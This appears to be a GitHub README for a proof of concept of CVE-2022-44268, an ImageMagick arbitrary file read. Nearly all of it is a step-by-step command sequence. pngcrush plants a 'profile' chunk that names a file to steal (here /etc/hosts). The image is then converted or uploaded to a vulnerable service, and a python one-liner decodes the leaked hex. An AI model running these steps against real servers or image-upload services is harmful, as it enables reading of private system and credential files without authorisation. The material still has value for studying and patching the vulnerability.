
# CVE-2022-44268 ImageMagick Arbitrary File Read PoC

### PoC for CVE-2022-44268 ImageMagick Arbitrary File Read PoC - Payload generator

### This project is created only for educational purposes and cannot be used for law violation or personal gain.
### The author of this project is not responsible for any possible harm caused by the materials of this project. 

### Original finding: https://www.metabaseq.com/imagemagick-zero-days/

### Usage: 
#### Installing dependencies:
`1. $ apt-get install pngcrush imagemagick exiftool exiv2 -y`

#### Change the filename you want to read below:
`2. $ pngcrush -text a "profile" "/etc/hosts" vjp.png`

#### Confirm everything worked perfectly
`3. $ exiv2 -pS pngout.png`

#### Trigger the PoC via convert or upload image to the vulnerable service:
`4. $ convert pngout.png gopro.png`

#### View content of file was read:
`5. $ identify -verbose gopro.png`

#### Decrypt the content:
`6. $ python3 -c 'print(bytes.fromhex("23202f6574632f686f7374730a3132372e302e302e31096c6f63616c686f73740a0a232054686520666f6c6c6f77696e67206c696e65732061726520646573697261626c6520666f7220495076362063617061626c6520686f7374730a3a3a3109096c6f63616c686f7374206970362d6c6f63616c686f7374206970362d6c6f6f706261636b0a666630323a3a3109096970362d616c6c6e6f6465730a666630323a3a3209096970362d616c6c726f75746572730a6475636e740a").decode("utf-8"))'`

## Demo
<img src="https://pbs.twimg.com/media/Fn-RDHzaIAAYy4m?format=png&name=large">
<img src="https://pbs.twimg.com/media/Fn-RDH7aYAcKkS0?format=png&name=large">
<img src="https://pbs.twimg.com/media/Fn-RDHzaMAIsohf?format=png&name=large">

## Tested with Ubuntu 22.04 and default imagemagick installed.
